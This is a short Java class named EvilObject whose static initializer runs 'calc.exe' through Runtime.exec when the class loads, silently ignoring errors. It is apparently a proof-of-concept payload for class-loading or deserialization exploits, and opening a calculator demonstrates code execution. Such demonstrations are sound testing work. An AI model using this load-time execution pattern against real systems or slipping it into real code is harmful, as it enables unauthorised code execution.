public class EvilObject {
    static {
        try {
            Runtime runtime = Runtime.getRuntime();
            String[] commands = {"calc.exe"};
            Process process = runtime.exec(commands);
            process.waitFor();
        } catch (Exception e) {
        }
    }
}
